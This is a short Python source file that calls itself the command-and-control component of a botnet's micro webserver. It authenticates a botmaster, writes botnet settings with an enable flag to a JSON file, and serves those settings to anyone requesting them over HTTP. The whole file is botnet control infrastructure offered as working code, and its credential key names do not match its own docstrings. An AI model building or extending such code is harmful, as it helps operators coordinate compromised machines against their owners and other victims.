"""
This is the script that will provide command-and-control features
to the micro webserver.

Created:     28 December 2016 
Modified:    28 December 2016
"""

from time import time
import json

class CCServer:

    def __init__(self, settings_path, admin):
        """
        This class provide a unique interface to the c&c server services.

        @param settings_path, string - botnet settings.json file path
        @param admin, dictionary - admin_usr, admin_pwd for auth
        """
        self._settings_path = settings_path
        self._admin     = admin
    
    def authenticate(self, credentials):
        """
        This method check for credentials to be from an authenticated user
        and therefore the privileges to change settings for the botnet.

        @param credentials, dictionary - auth_usr and auth_pwd
        @return boolean, True if authentication is successfull
        """
        auth_usr = credentials['auth_usr']  == self._admin['auth_usr']
        auth_pwd = credentials['admin_pwd'] == self._admin['admin_pwd']
        return auth_usr and auth_pwd
        
    
    def updateSettings(self, botnet_settings, enable=True):
        """
        This method allows authenticated users to update botnet settings.

        @param botnet_settings, dictionary
        """
        # adding timestamp to settings
        settings = dict()
        settings['timestamp'] = time()
        # enabling botnet
        settings['enable'] = enable
        # adding updated settings
        settings['settings'] = botnet_settings

        # preparing json
        settingsJSON = json.dumps(settings, sort_keys=False, indent=4)

        # writing the new json file
        settingsFile = open(self._settings_path, 'w')
        settingsFile.write(settingsJSON)
        settingsFile.close()


    def retrieveSettings(self):
        """
        This method allows everyone (botnet masters overall) reaching the server 
        via HTTP/GET to retrieve botnet settings.

        @param botnet_settings, dictionary
        @return String, settings to be printed out 
        """
        with open(self._settings_path) as settingsJSON:
            settings = json.load(settingsJSON)
            settingsJSON.close()
            return settings

